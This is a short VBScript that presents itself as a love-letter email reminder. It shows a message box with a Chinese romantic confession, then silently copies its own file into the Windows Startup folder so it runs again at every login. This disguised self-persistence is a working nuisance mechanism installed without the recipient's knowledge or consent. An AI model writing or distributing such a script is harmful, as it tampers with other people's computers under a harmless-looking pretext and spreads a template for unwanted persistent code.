msgbox"小可爱："+chr(13)+"我在无数个漆黑的夜晚，我独自放飞了的心穿过夜的黑，静静的潜伏在了你的宿舍前，默默地看着你，让我心无比的沉静。"+chr(13)+"我经常和你斗嘴，其实不是为别的。"+chr(13)+"只为与你说话。"+chr(13)+"每一次的遇见，都让我难以忘怀"+chr(13)+"你的笑，以深深地印在我的心里"+chr(13)+"                                                                                        ——果冻",1,"情书邮件提醒！"
set fso = createobject("scripting.filesystemobject")
set ws = createobject("wscript.shell")
pt = ws.specialfolders("startup") & "\"
set file = fso.getfile(wscript.scriptfullname)
file.copy pt